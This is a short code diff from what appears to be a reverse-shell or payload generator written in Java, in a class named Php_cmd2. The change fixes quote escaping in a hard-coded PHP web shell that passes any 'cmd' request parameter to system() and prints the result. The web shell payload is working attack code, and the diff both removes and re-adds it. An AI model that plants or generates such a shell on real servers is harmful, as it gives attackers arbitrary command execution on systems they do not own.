@@ -8,7 +8,7 @@ public class Php_cmd2 extends Reverse {
 
     public Php_cmd2(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("<?php if(isset($_REQUEST[\\'cmd\\'])){ echo \\\"<pre>\\\"; $cmd = ($_REQUEST[\\'cmd\\']); system($cmd); echo \\\"<\\/pre>\\\"; die; }?>");
+        shellFormat = String.format("<?php if(isset($_REQUEST[\'cmd\'])){ echo \"<pre>\"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo \"</pre>\"; die; }?>");
     }
 
     @Override
